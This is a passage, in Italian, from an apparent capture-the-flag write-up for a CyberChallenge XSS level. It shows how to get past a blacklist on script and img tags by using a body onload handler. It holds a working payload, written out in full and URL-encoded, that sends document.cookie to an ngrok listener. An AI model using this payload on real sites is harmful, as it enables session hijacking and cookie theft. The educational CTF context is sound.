@@ -1,0 +1,9 @@
+In questo caso, se io ora rimandassi lo stesso form di prima, mi farà notare che il tag script
+è nella blackList.
+Provandoci anche con l'immagine, pure quella è bloccata.
+Il body invece no, quindi semplicemente anzichè usare l'evento onerror usiamo onload 
+e ci metto lo stesso codice javascript della fetch che ho usato prima:
+<body onload='fetch("https://unuseable-nada-noncaustically.ngrok-free.dev?=" + document.cookie)' >
+Stessa cosa di prima ovvero metto in ascolto il server, mando la richiesta con il seguente url:
+http://xss4.challs.cyberchallenge.it/?html=%3Cbody+onload%3D%27fetch%28%22https%3A%2F%2Funuseable-nada-noncaustically.ngrok-free.dev%3F%3D%22+%2B+document.cookie%29%27+%3E
+e mi ritorna la flag.
